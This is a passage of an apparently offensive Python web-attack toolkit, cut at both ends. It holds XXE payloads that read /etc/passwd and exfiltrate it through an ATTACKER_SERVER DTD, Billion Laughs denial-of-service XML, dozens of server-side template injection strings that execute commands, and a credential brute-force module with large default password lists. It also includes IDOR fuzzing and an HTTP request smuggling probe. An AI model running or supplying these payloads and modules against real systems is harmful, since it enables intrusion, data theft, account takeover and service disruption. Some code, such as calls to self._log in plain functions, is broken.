        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]>
<foo>&xxe;</foo>""",

        # --- XXE for error-based detection (malformed XML) (Expanded) ---
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY % remote SYSTEM \"http://nonexistent.com/nonexistent.dtd\"> %remote;]>
<foo>&xxe;</foo>""", # External DTD that doesn't exist

        # --- XXE for OOB (Out-of-Band) interaction (Expanded) ---
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://ATTACKER_SERVER_IP_OR_DOMAIN/evil.dtd\"> %dtd;]>
<root>&exfil;</root>""", # Simpler OOB with external DTD
        # evil.dtd content: <!ENTITY % payload "<!ENTITY exfil SYSTEM 'file:///etc/passwd'>"> %payload;

        # --- XXE for DoS (Billion Laughs Attack) (Expanded) ---
        """<?xml version=\"1.0\"?>
<!DOCTYPE data [
  <!ENTITY a "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
  <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
  <!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
  <!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
  <!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
  <!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;">
  <!ENTITY j "&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;">
]>
<data>&j;</data>""", # Another Billion Laughs variant

        # --- XInclude (if XML parsing supports it) (Expanded) ---
        """<root xmlns:xi=\"http://www.w3.org/2001/XInclude\">
  <xi:include href=\"file:///c:/windows/win.ini\"/>
</root>""",
        """<root xmlns:xi=\"http://www.w3.org/2001/XInclude\">
  <xi:include href=\"http://ATTACKER_SERVER_IP_OR_DOMAIN/xinclude_test.xml\"/>
</root>""", # XInclude with external URL

        # --- SOAP XXE (example, often within a SOAP envelope) (Expanded) ---
        """<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">
  <soapenv:Header/>
  <soapenv:Body>
    <ns1:method xmlns:ns1=\"http://example.com/\">
      <arg1>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
        <value>&xxe;</value>
      </arg1>
    </ns1:method>
  </soapenv:Body>
</soapenv:Envelope>""", # SOAP XXE in an argument

        # --- Parameter Entity XXE (New) ---
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [
  <!ENTITY % param1 SYSTEM \"file:///etc/passwd\">
  <!ENTITY % param2 \"<!ENTITY exfil SYSTEM '%param1;'>\">
  %param2;
]>
<foo>&exfil;</foo>""", # Parameter entity for file disclosure

        # --- Base64 Encoded XXE (New) ---
        """<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"data:text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\">]>
<foo>&xxe;</foo>""", # Base64 encoded file path

        # --- DTD External Subset (New) ---
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo SYSTEM \"http://ATTACKER_SERVER_IP_OR_DOMAIN/external.dtd\">
<foo>&xxe;</foo>""", # External DTD for OOB
        # external.dtd content: <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]
    # Function to send XML request and check for indicators
    def send_and_check_xxe(payload_xml):
        current_headers = headers.copy() if headers else {}
        current_headers['Content-Type'] = 'application/xml' # Ensure correct content type

        try:
            response = requests.request(method, target_url, data=payload_xml, headers=current_headers, cookies=cookies, timeout=timeout, verify=verify_ssl)
            return response
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
            return None

    for payload_xml in xxe_payloads:
        print(f"    [>] Trying XXE payload: {payload_xml.splitlines()[0]}...") # Display first line
        response = send_and_check_xxe(payload_xml)

        if response is None:
            continue

        # Check for XXE indicators
        if "root:x:0:0" in response.text or "for 16-bit app support" in response.text.lower():
            vulnerabilities.append({
                "type": "XML External Entity (XXE) - File Disclosure",
                "severity": "High",
                "payload": payload_xml,
                "response_snippet": response.text[:500],
                "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', data='''{payload_xml}''', headers={{'Content-Type': 'application/xml'}}, {'cookies=' + str(cookies) if cookies else ''}, timeout={timeout}, verify={verify_ssl})"
            })
            print(f"        [!!!] XXE (File Disclosure) detected!")
            if "root:x:0:0" in response.text:
                vulnerabilities[-1]["extracted_content"] = "Found /etc/passwd content."
        elif "java.io.FileNotFoundException" in response.text or "failed to open stream" in response.text:
            # This could indicate an error-based XXE, confirming XML parsing
            vulnerabilities.append({
                "type": "XML External Entity (XXE) - Error-based Detection",
                "severity": "Medium",
                "payload": payload_xml,
                "response_snippet": response.text[:500],
                "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', data='''{payload_xml}''', headers={{'Content-Type': 'application/xml'}}, {'cookies=' + str(cookies) if cookies else ''}, timeout={timeout}, verify={verify_ssl})"
            })
            print(f"        [!!!] XXE (Error-based) detected!")
        elif "ATTACKER_SERVER_IP_OR_DOMAIN" in payload_xml:
            # For OOB, we can't directly detect exfiltration here without an actual listener.
            # We just report the attempt.
            vulnerabilities.append({
                "type": "XML External Entity (XXE) - Out-of-Band Attempt",
                "severity": "High",
                "payload": payload_xml,
                "response_snippet": "Check your attacker server logs for incoming requests.",
                "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', data='''{payload_xml}''', headers={{'Content-Type': 'application/xml'}}, {'cookies=' + str(cookies) if cookies else ''}, timeout={timeout}, verify={verify_ssl})"
            })
            print(f"        [!!!] XXE (Out-of-Band) attempt made! Check attacker server logs.")
        elif "lol9" in payload_xml and response.status_code == 500: # Billion Laughs often causes server errors
             vulnerabilities.append({
                "type": "XML External Entity (XXE) - Denial of Service (Billion Laughs)",
                "severity": "High",
                "payload": payload_xml,
                "response_snippet": response.text[:500],
                "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', data='''{payload_xml}''', headers={{'Content-Type': 'application/xml'}}, {'cookies=' + str(cookies) if cookies else ''}, timeout={timeout}, verify={verify_ssl})"
            })
             print(f"        [!!!] XXE (Denial of Service) detected!")

    return vulnerabilities

# --- SSTI Module ---

def perform_ssti_attack(target_url, method="GET", data=None, headers=None, cookies=None, timeout=10, verify_ssl=True):
    """
    Performs various Server-Side Template Injection (SSTI) attacks on the target URL.

    Args:
        target_url (str): The URL to attack.
        method (str): HTTP method (GET or POST).
        data (dict): POST data.
        headers (dict): HTTP headers.
        cookies (dict): HTTP cookies.
        timeout (int): Request timeout in seconds.
        verify_ssl (bool): Whether to verify SSL certificates.

    Returns:
        list: A list of dictionaries, each representing a detected vulnerability or information.
    """
    print(f"[+] Starting SSTI scan for: {target_url}")
    vulnerabilities = []

    ssti_payloads = [
        # Jinja2 / Twig
        "{{2*2}}", # Basic math
        "{{self.__class__.__bases__[0].__subclasses__()[40]('id').read()}}", # Python RCE (example index)
        "{{config.items()}}", # Flask config disclosure
        "{{_self.env.execute('id')}}", # Twig RCE
        
        # Freemarker
        "${2*2}",
        "<#assign ex='freemarker.template.utility.Execute'?new()> ${ ex('id') }", # RCE
        
        # Velocity
        "#set($x=$request.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id'))", # RCE
        
        # ERB (Ruby)
        "<%= `id` %>", # RCE
        "<%= system('id') %>", # RCE
        
        # Smarty
        "{system('id')}", # RCE
        "{php}echo `id`;{/php}", # RCE
        
        # Pug/Jade (Node.js)
        "#{'id'}", # Basic interpolation
        "#{process.mainModule.require('child_process').execSync('id')}", # RCE
        
        # Handlebars (Node.js)
        "{{lookup (lookup this 'constructor') 'getOwnPropertyNames' (lookup this 'constructor')}}", # Info disclosure
        
        # Generic command execution payloads (try to detect output)
        "{{system('id')}}",
        "{{`id`}}",
        "${system('id')}",
        "#{'id'}",
        "<%= `id` %>",
        # Jinja2 / Twig (Expanded)
        "{{ ''.__class__.__mro__[1].__subclasses__()[40]('id').read() }}", # Jinja2 RCE (common variant)
        "{{ cycler.__class__.__init__.__globals__.os.popen('id').read() }}", # Jinja2 RCE (another variant)
        "{{ g.__class__.__base__.__subclasses__()[10].__init__.__globals__['os'].popen('id').read() }}", # Jinja2 RCE (flask specific, needs index fuzzing)
        "{{ [].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\\'os\\').popen(\\'id\\').read()') }}", # Jinja2 eval RCE (needs index fuzzing)
        "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}", # Jinja2/Flask RCE
        "{{_ENV.get('SHELL', 'N/A')}}", # Twig info disclosure
        "{{_context._vars.app.request.server.all()}}", # Twig config disclosure

        # Freemarker (Expanded)
        "<#assign command='id'> <#assign ex=ex?new()> ${ex(command)}", # RCE variant
        "${'bash'?eval(id)}", # RCE variant
        "${T.java.lang.System.getProperty('user.dir')}", # Java system property
        "${.vars?keys}", # Variable enumeration

        # Velocity (Expanded)
        "#set($e = $runtime.getRuntime().exec(\"id\"))", # RCE variant
        "#set($str = $e.getInputStream().readAllBytes())", # RCE variant
        "$class.forname(\"java.lang.Runtime\").getMethods().get(6).invoke($class.forname(\"java.lang.Runtime\").getMethods().get(8).invoke(null),\"id\")", # RCE without #set

        # ERB (Ruby) (Expanded)
        "<%= %x(id) %>", # RCE variant
        "<%= IO.popen('id').read %>", # RCE variant
        "<%= require 'open3'; Open3.capture2('id') %>", # RCE variant

        # Smarty (Expanded)
        "{{/bin/bash -c id}}", # RCE variant (if template allows shell exec)
        "{literal}{/literal}{system('id')}", # Sandbox bypass

        # Pug/Jade (Node.js) (Expanded)
        "#{global.process.mainModule.require('child_process').execSync('id').toString()}", # RCE variant
        "#[process.env]", # Environment variable disclosure

        # Handlebars (Node.js) (Expanded)
        "{{this.constructor.FUNTION_NAME}}", # Property access (needs fuzzing)
        "{{this.__proto__.lookupProperty(\"constructor\").call(global, \"return process.mainModule.require('child_process').execSync('id')\")()}}", # RCE (complex)

        # Thymeleaf (Java) (New)
        "__${T(java.lang.Runtime).getRuntime().exec('id')}__", # RCE
        "__${T(java.lang.System).getProperty('user.home')}__", # Info disclosure

        # Twig (PHP) (Expanded from existing ideas)
        "{{_self.env.getCompilerClass().newInstance().getTest(\"id\").compile()}}", # RCE
        "{{_self.env.loadTemplate('{% set command=\"id\" %}{{command|e}}').render()}}", # RCE
        "{{app.request.server.all}}", # Info disclosure

        # Mako (Python) (New)
        "${ self.module.cache.set('foo', self.module.cache.get('bar').x.x.x.os.popen('id').read() ) }", # RCE (needs path fuzzing)
        "${ ''.__class__.__mro__[-1].__subclasses__()[-1].__init__.__globals__['os'].popen('id').read() }", # RCE

        # Flask/Jinja2 (Python) (Expanded from existing ideas)
        "{{ ''.__class__.__mro__[2].__subclasses__()[_].__init__.__globals__['os'].popen('id').read() }}", # RCE (needs index fuzzing)
        "{{ ''.__class__.__base__.__subclasses__()[_].__init__.__globals__['os'].popen('id').read() }}", # RCE (needs index fuzzing)
        r"{{ request.__class__.__init__.__globals__['os'].popen('id').read() }}", # Flask/Jinja2 RCE
        r"{{ self._TemplateReference__context.joiner.__init__.__globals__['os'].popen('id').read() }}", # Flask/Jinja2 RCE

        # ASP.NET Razor (C#) (New)
        "@System.Diagnostics.Process.Start(\"cmd.exe\", \"/c id\")", # RCE
        "@System.IO.File.ReadAllText(\"c:\\windows\\win.ini\")", # File read

        # Go Template (New)
        "{{. | call .exec \"id\"}}", # RCE (if exec function is available)
        "{{. | call .file \"/etc/passwd\"}}", # File read

        # Spring EL (Java) (New)
        "${T(java.lang.Runtime).getRuntime().exec(\"id\")}", # RCE
        "#{new java.lang.ProcessBuilder(\"id\").start()}", # RCE alternative

        # Mustache (JS/Ruby/PHP/Java) (Often logic-less, but try some basic info disclosure)
        "{{.}}", # Self-reflection
        "{{{_context.data}}}", # Debug info

        # Generic command execution payloads (try to detect output) (Expanded)
        "{{'id'|e}}", # Twig
        "{{'id'|execute}}", # Placeholder
        "[[id]]", # Some custom template engines
        "{{exec('id')}}",
        "{{shell_exec('id')}}",
    ]
    # Function to send request and check for SSTI indicators
    def send_and_check_ssti(payload_value, param_name):
        current_data = data.copy() if data else {}
        current_headers = headers.copy() if headers else {}
        current_cookies = cookies.copy() if cookies else {}

        if method == "GET":
            test_url = f"{target_url}?{param_name}={quote_plus(payload_value)}"
            try:
                response = requests.get(test_url, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                return response
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None
        elif method == "POST":
            current_data[param_name] = payload_value
            try:
                response = requests.post(target_url, data=current_data, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                return response
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None
        return None

    # Identify injectable parameters (simplified for now)
    parameters_to_test = ['name', 'query', 'message', 'id'] # Placeholder, should be dynamically discovered

    for param_name in parameters_to_test:
        print(f"[*] Testing parameter: {param_name}")

        for payload in ssti_payloads:
            print(f"    [>] Trying SSTI payload: {payload[:50]}...") # Truncate long payloads for display
            response = send_and_check_ssti(payload, param_name)

            if response is None:
                continue

            # Check for SSTI indicators
            # Basic math evaluation (e.g., 2*2 = 4)
            if "4" in response.text and ("{{2*2}}" in payload or "${2*2}" in payload):
                vulnerabilities.append({
                    "type": "Server-Side Template Injection (SSTI) - Basic Math",
                    "severity": "Medium",
                    "parameter": param_name,
                    "payload": payload,
                    "response_snippet": response.text[:500],
                    "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={timeout}, verify={verify_ssl})"
                })
                print(f"        [!!!] SSTI (Basic Math) detected in {param_name}!")
            
            # Command execution output (e.g., 'uid=', 'gid=', 'root', 'bin')
            if any(cmd_output in response.text for cmd_output in ["uid=", "gid=", "root", "bin", "daemon", "nobody"]):
                vulnerabilities.append({
                    "type": "Server-Side Template Injection (SSTI) - Command Execution",
                    "severity": "Critical",
                    "parameter": param_name,
                    "payload": payload,
                    "response_snippet": response.text[:500],
                    "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={timeout}, verify={verify_ssl})"
                })
                print(f"        [!!!] SSTI (Command Execution) detected in {param_name}!")
                # Attempt to extract command output
                match = re.search(r"(uid=\d+\(.*?\))", response.text) # Example for 'id' command
                if match:
                    vulnerabilities[-1]["extracted_output"] = match.group(1)
                
            # Information disclosure (e.g., config items)
            if "config.items()" in payload and ("SECRET_KEY" in response.text or "DATABASE_URL" in response.text):
                vulnerabilities.append({
                    "type": "Server-Side Template Injection (SSTI) - Information Disclosure",
                    "severity": "High",
                    "parameter": param_name,
                    "payload": payload,
                    "response_snippet": response.text[:500],
                    "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={timeout}, verify={verify_ssl})"
                })
                print(f"        [!!!] SSTI (Information Disclosure) detected in {param_name}!")

    return vulnerabilities

# --- Brute Force Login Module ---

def perform_brute_force_login(target_url, login_path, username_field, password_field, success_indicator, method="POST", usernames=None, passwords=None, headers=None, cookies=None, timeout=10, verify_ssl=True):
    """
    Performs brute-force login attempts on a target URL.

    Args:
        target_url (str): The base URL of the application.
        login_path (str): The path to the login endpoint (e.g., "/login.php").
        username_field (str): The name of the username input field.
        password_field (str): The name of the password input field.
        success_indicator (str): A string that indicates a successful login in the response body.
        method (str): HTTP method (POST or GET).
        usernames (list): List of usernames to try. If None, uses default.
        passwords (list): List of passwords to try. If None, uses default.
        headers (dict): HTTP headers.
        cookies (dict): HTTP cookies.
        timeout (int): Request timeout in seconds.
        verify_ssl (bool): Whether to verify SSL certificates.

    Returns:
        list: A list of dictionaries, each representing a detected successful login or information.
    """
    print(f"[+] Starting Brute Force Login scan for: {target_url}{login_path}")
    vulnerabilities = []

    default_usernames = [
        "admin", "user", "test", "root", "administrator", "guest", "support", "info",
        "webmaster", "sysadmin", "manager", "operator", "security", "dev", "ftp", "ssh",
        "ubuntu", "pi", "elastic", "postgres", "mysql", "oracle", "sa", "superadmin",
        "service", "backup", "monitor", "guest", "testuser", "testadmin", "developer",
        "john", "jane", "user1", "user2", "admin1", "admin2", "test1", "test2",
        "dbadmin", "appadmin", "webadmin", "sys", "system", "operator", "poweruser",
        "guestuser", "anonymous", "default", "changeme", "welcome", "user_name",
        "username", "login", "account", "master", "root", "toor", "admin_user",
        "admin_test", "admin_dev", "admin_prod", "admin_stage", "admin_qa",
        "admin_support", "admin_guest", "admin_info", "admin_web", "admin_sys",
        "admin_manager", "admin_operator", "admin_security", "admin_ftp", "admin_ssh",
        "admin_ubuntu", "admin_pi", "admin_elastic", "admin_postgres", "admin_mysql",
        "admin_oracle", "admin_sa", "admin_superadmin", "admin_service", "admin_backup",
        "admin_monitor", "admin_testuser", "admin_testadmin", "admin_developer",
        "admin_john", "admin_jane", "admin_user1", "admin_user2", "admin_admin1",
        "admin_admin2", "admin_test1", "admin_test2", "admin_dbadmin", "admin_appadmin",
        "admin_webadmin", "admin_sys", "admin_system", "admin_operator", "admin_poweruser",
        "admin_guestuser", "admin_anonymous", "admin_default", "admin_changeme",
        "admin_welcome", "admin_user_name", "admin_username", "admin_login",
        "admin_account", "admin_master", "admin_root", "admin_toor",
    ]
    default_passwords = [
        "password", "123456", "admin", "12345678", "qwerty", "123456789", "12345", "1234",
        "test", "welcome", "changeme", "access", "guest", "root", "toor", "admin123",
        "user123", "default", "password123", "secret", "master", "login", "pass",
        str(datetime.now().year), str(datetime.now().year - 1), str(datetime.now().year + 1),
        "Password", "P@ssword", "P@55w0rd", "1qaz@WSX", "QWERTY", "adminadmin", "admin@123",
        "1234567", "1234567890", "123qweasd", "test1234", "iloveyou", "company", "football",
        "sunshine", "raspberry", "tomcat", "jboss", "oracle", "postgres", "mysql", "mssql",
        "admin1", "admin2", "admin01", "admin02", "test1", "test2", "test01", "test02",
        "guest1", "guest2", "guest01", "guest02", "support1", "support2", "support01",
        "support02", "info1", "info2", "info01", "info02", "webmaster1", "webmaster2",
        "webmaster01", "webmaster02", "sysadmin1", "sysadmin2", "sysadmin01", "sysadmin02",
        "manager1", "manager2", "manager01", "manager02", "operator1", "operator2",
        "operator01", "operator02", "security1", "security2", "security01", "security02",
        "dev1", "dev2", "dev01", "dev02", "ftp1", "ftp2", "ftp01", "ftp02", "ssh1", "ssh2",
        "ssh01", "ssh02", "ubuntu1", "ubuntu2", "ubuntu01", "ubuntu02", "pi1", "pi2",
        "pi01", "pi02", "elastic1", "elastic2", "elastic01", "elastic02", "postgres1",
        "postgres2", "postgres01", "postgres02", "mysql1", "mysql2", "mysql01", "mysql02",
        "oracle1", "oracle2", "oracle01", "oracle02", "sa1", "sa2", "sa01", "sa02",
        "superadmin1", "superadmin2", "superadmin01", "superadmin02", "service1",
        "service2", "service01", "service02", "backup1", "backup2", "backup01",
        "backup02", "monitor1", "monitor2", "monitor01", "monitor02", "testuser1",
        "testuser2", "testuser01", "testuser02", "testadmin1", "testadmin2",
        "testadmin01", "testadmin02", "developer1", "developer2", "developer01",
        "developer02", "john1", "john2", "john01", "john02", "jane1", "jane2",
        "jane01", "jane02", "user_name1", "user_name2", "user_name01", "user_name02",
        "username1", "username2", "username01", "username02", "login1", "login2",
        "login01", "login02", "account1", "account2", "account01", "account02",
        "master1", "master2", "master01", "master02", "root1", "root2", "root01",
        "root02", "toor1", "toor2", "toor01", "toor02", "admin_user1", "admin_user2",
        "admin_user01", "admin_user02", "admin_test1", "admin_test2", "admin_test01",
        "admin_test02", "admin_dev1", "admin_dev2", "admin_dev01", "admin_dev02",
        "admin_prod1", "admin_prod2", "admin_prod01", "admin_prod02", "admin_stage1",
        "admin_stage2", "admin_stage01", "admin_stage02", "admin_qa1", "admin_qa2",
        "admin_qa01", "admin_qa02", "admin_support1", "admin_support2", "admin_support01",
        "admin_support02", "admin_guest1", "admin_guest2", "admin_guest01", "admin_guest02",
        "admin_info1", "admin_info2", "admin_info01", "admin_info02", "admin_web1",
        "admin_web2", "admin_web01", "admin_web02", "admin_sys1", "admin_sys2",
        "admin_sys01", "admin_sys02", "admin_manager1", "admin_manager2",
        "admin_manager01", "admin_manager02", "admin_operator1", "admin_operator2",
        "admin_operator01", "admin_operator02", "admin_security1", "admin_security2",
        "admin_security01", "admin_security02", "admin_dev1", "admin_dev2",
        "admin_dev01", "admin_dev02", "admin_ftp1", "admin_ftp2",
        "admin_ftp01", "admin_ftp02", "admin_ssh1", "admin_ssh2", "admin_ssh01",
        "admin_ssh02", "admin_ubuntu1", "admin_ubuntu2", "admin_ubuntu01",
        "admin_ubuntu02", "admin_pi1", "admin_pi2", "admin_pi01", "admin_pi02",
        "admin_elastic1", "admin_elastic2", "admin_elastic01", "admin_elastic02",
        "admin_postgres1", "admin_postgres2", "admin_postgres01", "admin_postgres02",
        "admin_mysql1", "admin_mysql2", "admin_mysql01", "admin_mysql02",
        "admin_oracle1", "admin_oracle2", "admin_oracle01", "admin_oracle02",
        "admin_sa1", "admin_sa2", "admin_sa01", "admin_sa02", "admin_superadmin1",
        "admin_superadmin2", "admin_superadmin01", "admin_superadmin02",
        "admin_service1", "admin_service2", "admin_service01", "admin_service02",
        "admin_backup1", "admin_backup2", "admin_backup01", "admin_backup02",
        "admin_monitor1", "admin_monitor2", "admin_monitor01", "admin_monitor02",
        "admin_testuser1", "admin_testuser2", "admin_testuser01", "admin_testuser02",
        "admin_testadmin1", "admin_testadmin2", "admin_testadmin01", "admin_testadmin02",
        "admin_developer1", "admin_developer2", "admin_developer01", "admin_developer02",
        "admin_john1", "admin_john2", "admin_john01", "admin_john02", "admin_jane1",
        "admin_jane2", "admin_jane01", "admin_jane02", "admin_user_name1",
        "admin_user_name2", "admin_user_name01", "admin_user_name02", "admin_username1",
        "admin_username2", "admin_username01", "admin_username02", "admin_login1",
        "admin_login2", "admin_login01", "admin_login02", "admin_account1",
        "admin_account2", "admin_account01", "admin_account02", "admin_master1",
        "admin_master2", "admin_master01", "admin_master02", "admin_root1",
        "admin_root2", "admin_root01", "admin_root02", "admin_toor1", "admin_toor2",
        "admin_toor01", "admin_toor02",
    ]

    usernames_to_try = usernames if usernames else default_usernames
    passwords_to_try = passwords if passwords else default_passwords

    login_url = f"{target_url}{login_path}"

    # Simple rate limiting/account lockout detection (can be expanded)
    failed_attempts = 0
    last_attempt_time = time.time()
    rate_limit_threshold = 5 # Max failed attempts before a short pause
    rate_limit_pause = 5 # seconds

    for username in usernames_to_try:
        for password in passwords_to_try:
            current_data = {
                username_field: username,
                password_field: password
            }
            current_headers = headers.copy() if headers else {}
            current_cookies = cookies.copy() if cookies else {}

            print(f"    [>] Trying {username}:{password}...")

            try:
                if method.upper() == "POST":
                    response = requests.post(login_url, data=current_data, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                else: # Assume GET
                    response = requests.get(login_url, params=current_data, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                
                if success_indicator in response.text:
                    vulnerabilities.append({
                        "type": "Brute Force Login - Successful Credentials",
                        "severity": "Critical",
                        "username": username,
                        "password": password,
                        "login_url": login_url,
                        "response_snippet": response.text[:500],
                        "poc_code": f"import requests\nrequests.request(method='{method}', url='{login_url}', data={{{username_field}: '{username}', {password_field}: '{password}'}}, {'headers=' + str(headers) if headers else ''}, {'cookies=' + str(cookies) if cookies else ''}, timeout={timeout}, verify={verify_ssl})"
                    })
                    print(f"        [!!!] Successful login found: {username}:{password}!")
                    return vulnerabilities # Stop on first successful login
                else:
                    failed_attempts += 1
                    if failed_attempts >= rate_limit_threshold:
                        self._log(f"[INFO] Detected {rate_limit_threshold} failed attempts. Pausing for {rate_limit_pause} seconds to avoid lockout.")
                        time.sleep(rate_limit_pause)
                        failed_attempts = 0 # Reset counter after pause
                    
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed for {username}:{password}: {e}")
                # Consider this a failed attempt for rate limiting purposes
                failed_attempts += 1
                if failed_attempts >= rate_limit_threshold:
                    self._log(f"[INFO] Detected {rate_limit_threshold} failed attempts. Pausing for {rate_limit_pause} seconds to avoid lockout.")
                    time.sleep(rate_limit_pause)
                    failed_attempts = 0 # Reset counter after pause

    print(f"[+] Brute Force Login scan completed for: {target_url}{login_path}")
    return vulnerabilities

# --- IDOR (Insecure Direct Object References) Module (NEW) ---

def perform_idor_attack(target_url, method="GET", data=None, headers=None, cookies=None, timeout=10, verify_ssl=True):
    """
    Detects and exploits IDOR vulnerabilities by fuzzing numeric identifiers.

    Args:
        target_url (str): The URL to attack, including query parameters.
        method (str): HTTP method (GET or POST).
        data (dict): POST data.
        headers (dict): HTTP headers.
        cookies (dict): HTTP cookies.
        timeout (int): Request timeout.
        verify_ssl (bool): SSL verification.

    Returns:
        list: A list of dictionaries, each representing a detected vulnerability.
    """
    print(f"[+] Starting IDOR scan for: {target_url}")
    vulnerabilities = []
    
    from urllib.parse import urlparse, parse_qs, urlencode
    
    parsed_url = urlparse(target_url)
    query_params = parse_qs(parsed_url.query)
    
    # Identify numeric parameters to fuzz
    fuzzable_params = {}
    for param, values in query_params.items():
        if values and values[0].isdigit():
            fuzzable_params[param] = int(values[0])
            
    if not fuzzable_params:
        print("    [INFO] No numeric parameters found in URL for IDOR fuzzing.")
        return vulnerabilities

    # Get baseline response
    try:
        baseline_response = requests.request(method, target_url, data=data, headers=headers, cookies=cookies, timeout=timeout, verify=verify_ssl)
    except requests.RequestException as e:
        print(f"    [ERROR] Baseline request failed: {e}")
        return vulnerabilities

    for param, original_id in fuzzable_params.items():
        print(f"[*] Fuzzing parameter '{param}' with original ID: {original_id}")
        
        # Fuzz a range of IDs around the original one
        for i in range(-10, 11):
            if i == 0:
                continue
            
            fuzzed_id = original_id + i
            
            # Create the new URL with the fuzzed ID
            fuzzed_params = query_params.copy()
            fuzzed_params[param] = [str(fuzzed_id)]
            fuzzed_url = parsed_url._replace(query=urlencode(fuzzed_params, doseq=True)).geturl()
            
            print(f"    [>] Trying ID: {fuzzed_id} at {fuzzed_url}")

            try:
                response = requests.request(method, fuzzed_url, data=data, headers=headers, cookies=cookies, timeout=timeout, verify=verify_ssl)
                
                # --- Advanced IDOR Detection Logic ---
                # 1. Must be a successful request
                if response.status_code != 200:
                    continue
                
                # 2. Content length should be similar but not identical (to filter out error pages vs. valid but different user data)
                len_diff = abs(len(response.text) - len(baseline_response.text))
                if not (len(response.text) > 100 and len_diff > 10 and len_diff < (len(baseline_response.text) * 0.5)):
                     continue

                # 3. Content must be different from baseline
                if response.text == baseline_response.text:
                    continue
                    
                # If all checks pass, it's a potential IDOR
                vulnerabilities.append({
                    "type": "Insecure Direct Object References (IDOR)",
                    "severity": "High",
                    "parameter": param,
                    "payload": fuzzed_id,
                    "url": fuzzed_url,
                    "response_snippet": response.text[:500],
                    "extracted_data": f"Successfully accessed resource with ID {fuzzed_id}. The response is different from the baseline, indicating access to another user's data.",
                    "poc_code": f"import requests\nrequests.request(method='{method}', url='{fuzzed_url}', data={data}, headers={headers}, cookies={cookies}, timeout={timeout}, verify={verify_ssl})"
                })
                print(f"        [!!!] Potential IDOR detected on parameter '{param}' with ID '{fuzzed_id}'!")
                # Stop after first find per parameter to reduce noise, but continue to next parameter
                break 

            except requests.RequestException as e:
                print(f"    [-] Request with ID {fuzzed_id} failed: {e}")

    return vulnerabilities

# --- HTTP Smuggling Module (NEW) ---

async def _send_raw_http_request(host, port, raw_request, timeout=10):
    """Helper to send raw HTTP requests using asyncio for smuggling."""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=(port == 443)),
            timeout=timeout
        )
        
        writer.write(raw_request.encode('utf-8'))
        await writer.drain()
        
        response_bytes = await asyncio.wait_for(reader.read(8192), timeout=timeout)
        
        writer.close()
        await writer.wait_closed()
        
        return response_bytes.decode('utf-8', errors='ignore')
    except asyncio.TimeoutError:
        return "TIMEOUT"
    except Exception as e:
        return f"ERROR: {e}"

async def perform_http_smuggling_attack(target_url, headers=None, cookies=None, timeout=15):
    """
    Detects HTTP Smuggling vulnerabilities (CL.TE and TE.CL) using time-based methods.
    """
    print(f"[+] Starting HTTP Smuggling scan for: {target_url}")
    vulnerabilities = []
    
    from urllib.parse import urlparse
    parsed_url = urlparse(target_url)
    host = parsed_url.netloc
    port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
    path = parsed_url.path or "/"

    # 1. CL.TE Probe (Front-end uses Content-Length, Back-end uses Transfer-Encoding)
    cl_te_payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n\r\n"
        "0\r\n\r\n"
        "G" # This should be left unprocessed by the back-end, causing a timeout
    )
    print("    [>] Trying CL.TE probe...")
    start_time = time.time()
    response = await _send_raw_http_request(host, port, cl_te_payload, timeout)
    duration = time.time() - start_time
    
    if response == "TIMEOUT" or duration >= (timeout - 1):
        vulnerabilities.append({
            "type": "HTTP Smuggling (CL.TE)",
